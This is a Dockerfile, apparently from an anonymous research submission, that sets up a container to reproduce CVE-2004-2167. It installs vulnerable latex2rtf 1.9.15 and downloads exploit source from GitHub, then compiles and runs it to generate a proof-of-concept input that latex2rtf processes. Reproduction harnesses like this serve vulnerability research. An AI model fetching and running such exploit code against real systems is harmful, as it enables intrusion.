FROM debian:latest

MAINTAINER "anonymous2018" <anonymous_submission@hotmail.com>

RUN apt-get -y update ; \
    apt-get install -y build-essential wget vim; \
    cd /root/; \
    wget https://github.com/anonymous2018sub/anonymous2018sub.github.io/raw/master/CVE-2004-2167/latex2rtf-1.9.15.tar.gz; \
    wget https://raw.githubusercontent.com/anonymous2018sub/anonymous2018sub.github.io/master/CVE-2004-2167/latex2rtf.c; \
    tar -xvf latex2rtf-1.9.15.tar.gz; cd latex2rtf-1.9.15/; make; make install; \
    cd ..; gcc -o exploit latex2rtf.c; ./exploit > poc.tex; \
    rm -rf /var/lib/apt/lists/*;

CMD /root/latex2rtf-1.9.15/latex2rtf /root/poc.tex
